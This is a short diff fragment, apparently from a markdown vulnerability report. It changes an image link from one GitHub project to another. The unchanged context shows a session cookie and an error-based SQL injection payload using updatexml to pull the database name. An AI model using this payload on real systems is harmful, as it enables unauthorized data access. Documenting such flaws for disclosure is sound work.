@@ -30,5 +30,5 @@ Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe
 id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 ```
 
-![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)
+![](https://github.com/mikeccltt/chatbot/blob/main/chatbot-app-suggestion-phpoop/sql.gif?raw=true)
 
